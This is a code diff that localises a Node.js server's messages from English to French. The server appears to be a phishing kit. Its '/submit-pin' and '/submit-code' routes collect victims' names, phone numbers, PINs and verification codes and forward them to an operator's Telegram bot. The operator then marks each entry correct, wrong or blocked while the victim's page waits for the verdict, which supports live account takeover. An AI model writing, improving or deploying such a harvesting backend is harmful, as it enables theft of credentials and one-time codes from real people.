@@ -26,7 +26,7 @@ Object.keys(process.env).forEach(key => {
         bots.push({ botId: `bot${index}`, botToken, chatId });
     }
 });
-console.log('✅ Bots loaded:', bots.map(b => b.botId));
+console.log('✅ Bots chargés:', bots.map(b => b.botId));
 
 // ---------------- MIDDLEWARE ----------------
 app.use(express.json());
@@ -46,7 +46,7 @@ async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
             reply_markup: inlineKeyboard.length ? { inline_keyboard: inlineKeyboard } : undefined
         });
     } catch (err) {
-        console.error('Telegram send error:', err.response?.data || err.message);
+        console.error('Erreur Telegram:', err.response?.data || err.message);
     }
 }
 
@@ -65,9 +65,9 @@ async function setWebhook(bot) {
     try {
         const webhookUrl = `${DOMAIN}/telegram-webhook/${bot.botId}`;
         await axios.get(`https://api.telegram.org/bot${bot.botToken}/setWebhook?url=${webhookUrl}`);
-        console.log(`✅ Webhook set for ${bot.botId}`);
+        console.log(`✅ Webhook configuré pour ${bot.botId}`);
     } catch (err) {
-        console.error(`❌ Webhook failed for ${bot.botId}:`, err.response?.data || err.message);
+        console.error(`❌ Échec du webhook pour ${bot.botId}:`, err.response?.data || err.message);
     }
 }
 
@@ -79,7 +79,7 @@ async function setAllWebhooks() {
 // ---------------- PAGES ----------------
 app.get('/bot/:botId', (req, res) => {
     const bot = getBot(req.params.botId);
-    if (!bot) return res.status(404).send('Invalid bot link');
+    if (!bot) return res.status(404).send('Lien bot invalide');
     res.redirect(`/index.html?botId=${bot.botId}`);
 });
 app.get('/pin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pin.html')));
@@ -90,16 +90,16 @@ app.get('/success', (req, res) => res.sendFile(path.join(__dirname, 'public', 's
 app.post('/submit-pin', (req, res) => {
     const { name, phone, pin, botId } = req.body;
     const bot = getBot(botId);
-    if (!bot) return res.status(400).json({ error: 'Invalid bot' });
+    if (!bot) return res.status(400).json({ error: 'Bot invalide' });
 
     const requestId = uuidv4();
     approvedPins[requestId] = null;
     requestBotMap[requestId] = botId;
 
-    sendTelegramMessage(bot, `🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${pin}`, [[
-        { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
-        { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` },
-        { text: '🛑 Block', callback_data: `pin_block:${requestId}` }
+    sendTelegramMessage(bot, `🔐 VÉRIFICATION DU CODE PIN\n\nNom: ${name}\nTéléphone: ${phone}\nPIN: ${pin}`, [[
+        { text: '✅ PIN correct', callback_data: `pin_ok:${requestId}` },
+        { text: '❌ PIN incorrect', callback_data: `pin_bad:${requestId}` },
+        { text: '🛑 Bloquer', callback_data: `pin_block:${requestId}` }
     ]]);
 
     res.json({ requestId });
@@ -107,7 +107,7 @@ app.post('/submit-pin', (req, res) => {
 
 app.get('/check-pin/:requestId', (req, res) => {
     const requestId = req.params.requestId;
-    if (blockPins[requestId]) return res.json({ blocked: true, message: 'User blocked' });
+    if (blockPins[requestId]) return res.json({ blocked: true, message: 'Utilisateur bloqué' });
     res.json({ approved: approvedPins[requestId] ?? null });
 });
 
@@ -115,16 +115,16 @@ app.get('/check-pin/:requestId', (req, res) => {
 app.post('/submit-code', (req, res) => {
     const { name, phone, code, botId } = req.body;
     const bot = getBot(botId);
-    if (!bot) return res.status(400).json({ error: 'Invalid bot' });
+    if (!bot) return res.status(400).json({ error: 'Bot invalide' });
 
     const requestId = uuidv4();
     approvedCodes[requestId] = null;
     requestBotMap[requestId] = botId;
 
-    sendTelegramMessage(bot, `🔑 CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`, [[
-        { text: '✅ Correct Code', callback_data: `code_ok:${requestId}` },
-        { text: '❌ Wrong Code', callback_data: `code_bad:${requestId}` },
-        { text: '✅ Code OK + ❌ PIN Wrong', callback_data: `code_pin:${requestId}` }
+    sendTelegramMessage(bot, `🔑 VÉRIFICATION DU CODE\n\nNom: ${name}\nTéléphone: ${phone}\nCode: ${code}`, [[
+        { text: '✅ Code correct', callback_data: `code_ok:${requestId}` },
+        { text: '❌ Code incorrect', callback_data: `code_bad:${requestId}` },
+        { text: '✅ Code OK + ❌ PIN incorrect', callback_data: `code_pin:${requestId}` }
     ]]);
 
     res.json({ requestId });
@@ -145,14 +145,14 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
     const [action, requestId] = cb.data.split(':');
     let feedback = '';
 
-    if (action === 'pin_ok') { approvedPins[requestId] = true; feedback = 'PIN approved ✅'; }
-    if (action === 'pin_bad') { approvedPins[requestId] = false; feedback = 'PIN rejected ❌'; }
-    if (action === 'pin_block') { blockPins[requestId] = true; feedback = 'User blocked 🛑'; }
-    if (action === 'code_ok') { approvedCodes[requestId] = true; feedback = 'Code approved ✅'; }
-    if (action === 'code_bad') { approvedCodes[requestId] = false; feedback = 'Code rejected ❌'; }
-    if (action === 'code_pin') { approvedCodes[requestId] = true; approvedPins[requestId] = false; feedback = 'Code approved – re-enter PIN'; }
+    if (action === 'pin_ok') { approvedPins[requestId] = true; feedback = 'PIN approuvé ✅'; }
+    if (action === 'pin_bad') { approvedPins[requestId] = false; feedback = 'PIN rejeté ❌'; }
+    if (action === 'pin_block') { blockPins[requestId] = true; feedback = 'Utilisateur bloqué 🛑'; }
+    if (action === 'code_ok') { approvedCodes[requestId] = true; feedback = 'Code approuvé ✅'; }
+    if (action === 'code_bad') { approvedCodes[requestId] = false; feedback = 'Code rejeté ❌'; }
+    if (action === 'code_pin') { approvedCodes[requestId] = true; approvedPins[requestId] = false; feedback = 'Code approuvé – ressaisir le PIN'; }
 
-    if (feedback) await sendTelegramMessage(bot, `📝 Feedback:\n${feedback}`);
+    if (feedback) await sendTelegramMessage(bot, `📝 Retour:\n${feedback}`);
     await answerCallback(bot, cb.id);
     res.sendStatus(200);
 });
@@ -162,5 +162,5 @@ app.get('/debug/bots', (req, res) => res.json(bots));
 
 // ---------------- START SERVER ----------------
 setAllWebhooks().then(() => {
-    app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
+    app.listen(PORT, () => console.log(`🚀 Serveur démarré sur le port ${PORT}`));
 });
